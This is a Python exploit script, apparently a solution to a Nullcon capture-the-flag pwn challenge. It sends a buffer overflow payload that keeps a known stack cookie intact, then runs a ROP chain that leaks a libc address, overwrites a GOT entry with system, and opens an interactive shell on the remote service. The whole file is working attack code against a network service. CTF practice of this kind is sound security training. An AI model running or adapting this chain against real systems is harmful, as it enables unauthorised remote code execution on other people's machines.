import socket
import struct
import telnetlib
import time

SERVER = ('pwn3.ctf.nullcon.net', 1234)
COOKIE = 0x1337c00ceeee

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(SERVER)
s.recv(1024)

buf = b''
buf += b'a' * 20
buf += struct.pack('<Q', COOKIE)

buf += b'a' * 44

p_rdi_r = 0x400ab3
p_rsi_p_r = 0x400ab1
p_rdx_r = 0x4007cb
read_got = 0x601038
read_libc_offset = 0x110070
read_plt = 0x400690
write_got = 0x601020
write_plt = 0x400660
sh = 0x400b15
system_libc_offset = 0x4f440
dot_data = 0x601060

# rop chain start
buf += struct.pack('<Q', p_rdi_r)
buf += struct.pack('<Q', 1)
buf += struct.pack('<Q', p_rsi_p_r)
buf += struct.pack('<Q', read_got)
buf += b'a' * 8
buf += struct.pack('<Q', p_rdx_r)
buf += struct.pack('<Q', 8)
buf += struct.pack('<Q', write_plt)

'''
buf += struct.pack('<Q', p_rdi_r)
buf += struct.pack('<Q', 0)
buf += struct.pack('<Q', p_rsi_p_r)
buf += struct.pack('<Q', dot_data)
buf += b'a' * 8
buf += struct.pack('<Q', p_rdx_r)
buf += struct.pack('<Q', 9)
buf += struct.pack('<Q', read_plt)
'''

buf += struct.pack('<Q', p_rdi_r)
buf += struct.pack('<Q', 0)
buf += struct.pack('<Q', p_rsi_p_r)
buf += struct.pack('<Q', write_got)
buf += b'a' * 8
buf += struct.pack('<Q', p_rdx_r)
buf += struct.pack('<Q', 8)
buf += struct.pack('<Q', read_plt)

buf += struct.pack('<Q', 0x40063e)

buf += struct.pack('<Q', p_rdi_r)
buf += struct.pack('<Q', sh)
buf += struct.pack('<Q', write_plt)
buf += b'a' * 8

input('...')
s.send(buf)
# s.recv(1024)
d = s.recv(1024)
read_libc = struct.unpack('<Q', d)[0]
libc_base = read_libc - read_libc_offset
system_libc = libc_base + system_libc_offset
print(f'[+] read@libc: {hex(read_libc)}')
print(f'[+] libc base: {hex(libc_base)}')
print(f'[+] system@libc: {hex(system_libc)}')

# s.send(b'/bin/sh\x00')
# s.send(b'cat flag\x00')
s.send(struct.pack('<Q', system_libc))

t = telnetlib.Telnet()
t.sock = s
t.interact()
